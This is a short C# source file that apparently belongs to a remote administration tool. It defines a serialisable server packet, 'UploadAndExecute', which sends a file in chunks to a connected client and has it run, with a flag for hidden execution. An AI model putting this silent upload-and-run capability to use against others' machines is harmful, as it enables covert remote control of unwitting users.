using ProtoBuf;

namespace xServer.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class UploadAndExecute : IPacket
    {
        [ProtoMember(1)]
        public int ID { get; set; }

        [ProtoMember(2)]
        public string FileName { get; set; }

        [ProtoMember(3)]
        public byte[] Block { get; set; }

        [ProtoMember(4)]
        public int MaxBlocks { get; set; }

        [ProtoMember(5)]
        public int CurrentBlock { get; set; }

        [ProtoMember(6)]
        public bool RunHidden { get; set; }

        public UploadAndExecute()
        {
        }

        public UploadAndExecute(int id, string filename, byte[] block, int maxblocks, int currentblock, bool runhidden)
        {
            this.ID = id;
            this.FileName = filename;
            this.Block = block;
            this.MaxBlocks = maxblocks;
            this.CurrentBlock = currentblock;
            this.RunHidden = runhidden;
        }

        public void Execute(Client client)
        {
            client.Send<UploadAndExecute>(this);
        }
    }
}